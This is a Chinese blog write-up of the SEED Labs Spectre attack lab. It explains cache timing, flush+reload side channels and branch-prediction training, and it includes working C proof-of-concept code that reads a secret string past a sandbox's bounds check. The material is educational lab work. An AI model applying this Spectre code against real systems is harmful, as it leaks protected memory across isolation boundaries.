---
title: Spectre-Attack-Lab
categories:
  - SeedLabs/SystemSecurity
tags:
  - Spectre
abbrlink: '5e644521'
date: 2022-11-19 00:27:23
---

## Task 1: Reading from Cache versus from Memory

在我们访问过一个块之后，再次访问这个块，速度会快很多，这就是 `CPU cache` 的功劳。换一个说法，就是 `CPU` 把之前的访问记录在 `cache` 里面存储了起来。

```c
uint8_t array[10 * 4096];

int main(int argc, const char **argv)
{
  int junk = 0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  // Initialize the array
  for (i = 0; i < 10; i++)
    array[i * 4096] = 1;
  // FLUSH the array from the CPU cache
  for (i = 0; i < 10; i++)
    _mm_clflush(&array[i * 4096]);
  // Access some of the array items
  array[3 * 4096] = 100;
  array[7 * 4096] = 200;
  for (i = 0; i < 10; i++)
  {
    addr = &array[i * 4096];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    printf("Access time for array[%d*4096]: %d CPU cycles\n", i, (int)time2);
  }
  return 0;
}
```

可以看到，第 3 和第 7 个块的访问时间比其他的少得多，多次重复后，我们可以发现这个阈值大概就是 `80` 左右。

![image-20221118223706892](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221118223706892.png)

我们可以看到第 `0` 个块的访问时间异常的久，偶尔也会比较短。这是因为第 `0` 个块可能会受数组前其他地址访问的影响。其实虽然我们划分了每个块都是 `4096` 的大小，但是并不是内存就是按照我们这样分块的，我们这样只是可以保证取的这些值不出现在同一个块中罢了，不能保证 `[0, 4095]` 就是同一个块。因此，下面我们访问块时都用 `array[i * 4096 + DELTA]`，增加一个偏移，避免第 `0` 个元素被其他内容影响，这个偏移我们一般设置为 `1024`。

## Task 2: Using Cache as a Side Channel

侧信道攻击，核心思想是通过加密软件或硬件运行时产生的各种泄漏信息获取密文信息。这里我们使用的是 `cache`。如果我们使用了 `array` 数组并且只访问了第 `secret` 块，那么就可以通过访问时间的长短得到 `secret` 的结果，这里我们把阈值设置为 `80`，也就是说，当结果小于 `80` 的时候我们认为这是从 `cache` 中捕获的数据。

![image-20221118224216763](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221118224216763.png)

## Task 3: Out-of-Order Execution and Branch Prediction

```c
data = 0;
if (x < size) {
    data = data + 5;
}
```

`CPU` 的乱序执行，例如下面这个逻辑，当 `x >= size` 的时候，语句就一定不执行吗？其实并不是的。现在的 `CPU` 采用了乱序执行和分支预测的优化，如果我们前几次执行，都满足条件，那么这次执行，`CPU` 会预测也能满足条件，从而使得语句也被执行（乱序执行），当后续判断出条件不成立的时候，`CPU` 会将程序执行的结果回滚，假装什么都没发生。

但是，很遗憾的是，并不是什么都没发生，并不是所有的结果都被抹去了，`cache` 上其实有存档的！！！虽然对于段代码没有用，但是我们可以利用这种特性，构造某些恶意代码，首先，我们调用 `victim(i)` 欺骗 `CPU`，引发分支预测执行，然后清空缓存，接下来执行 `victim(97)` 这样，虽然这个代码不该被执行，但是因为分支预测和乱序执行的存在，这段代码其实是执行了的，我们可以从 `cache` 中捕捉到这种变化。

```c
void victim(size_t x)
{
  if (x < size) // size = 10
  {
    temp = array[x * 4096 + DELTA];
  }
}

int main()
{
  int i;

  // FLUSH the probing array
  flushSideChannel();

  // Train the CPU to take the true branch inside victim()
  for (i = 0; i < 10; i++)
  {
    victim(i);
  }

  // Exploit the out-of-order execution
  _mm_clflush(&size); // @
  for (i = 0; i < 256; i++)
    _mm_clflush(&array[i * 4096 + DELTA]);
  victim(97);

  // RELOAD the probing array
  reloadSideChannel();
    
// output
// array[97*4096 + 1024] is in cache.
// The Secret = 97.
```

如果我们注释掉 `@` 那行语句，得不到结果。我认为是因为如果没有清空 `size` 的缓存，那么分支判断语句执行的速度就会快于我们希望执行的语句，导致我们的希望的语句不会被执行。

如果我们把 `victim(i);` 修改为 `victim(i + 20);`，同样不能得到结果，因为这样我们无法训练 `CPU` 了，由于 `CPU` 没有足够的把握觉得分支会执行，那么它就会放弃预测。

## Task 4: The Spectre Attack

```c
uint8_t buffer[10] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9};
char *secret = "Some Secret Value";
uint8_t array[256 * 4096];

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
  if (x <= bound_upper && x >= bound_lower) {
    return buffer[x];
  }
  else {
    return 0;
  }
}

void spectreAttack(size_t index_beyond)
{
  int i;
  uint8_t s;
  volatile int z;
  // Train the CPU to take the true branch inside restrictedAccess().
  for (i = 0; i < 10; i++) {
    restrictedAccess(i);
  }
  // Flush bound_upper, bound_lower, and array[] from the cache.
  _mm_clflush(&bound_upper);
  _mm_clflush(&bound_lower);
  for (i = 0; i < 256; i++) {
    _mm_clflush(&array[i * 4096 + DELTA]);
  }
  for (z = 0; z < 100; z++) { }
  // Ask restrictedAccess() to return the secret in out-of-order execution.
  s = restrictedAccess(index_beyond);
  array[s * 4096 + DELTA] += 88;
}
```

对于这个程序，虽然我们进行边界判断，但是我们可以通过训练 `CPU` 使得预测分支执行绕过，那么 `buffer[x]` 会被执行。如果这个 `x` 的值是 `secret` 和 `buffer` 地址的差值，比如是 `-1`，那么我们其实是 `return` 了 `secret[0]` 的值。然后这个值调用了 `array[s * 4096 + DELTA] += 88;`，加 `88` 不是重点，重点是我们让这块内存到 `cache` 中来了。最后，通过遍历数组，我们可以拿到哪一块的时间段，对应的值就是 `s` 就是 `secret[0]`，然后如法炮制，把 `secret` 中的所有数据都能拿到。

![image-20221118232818983](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221118232818983.png)

## Task 5: Improve the Attack Accuracy

完善一下，因为 `cache` 中也有很多噪声，并不是每次都能拿到最正确的那个值。我们可以多次重复实验，取一个出现次数最多的值，那么这个值就八九不离十了。

```c
  for (i = 0; i < 1000; i++)
  {
    printf("*****\n"); // This seemly "useless" line is necessary for the attack to succeed
    spectreAttack(index_beyond);
    usleep(10);
    reloadSideChannelImproved();
  }
```

我们执行代码，发现得到的结果总是为 `0`，我们需要修复代码了，很显然，是因为第 `0` 个块被缓存了，可是我们清空缓存了呀，这是因为，我们使得分支预测成功的概率不是 `100%`，但分支预测失败，就会返回 `0`，并且还有可能是其他内存带动了第 `0` 块缓存。这个时候我们只要去掉第 `0` 块就行了，不参与计算。

如果去掉那个看似无用的 `printf` 语句，那么函数是无法执行，`CPU` 的秘密我劝你别猜（好吧，估计是操作系统的锅，实验文档说 `ubuntu16` 可以去掉，20 不行）。我设置了不同的 `usleep` 时间，确实有改变，但是这个改变似乎是因为不同的执行之间本来就有的误差。

## Task 6: Steal the Entire Secret String

写一个循环即可

![image-20221119002129901](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221119002129901.png)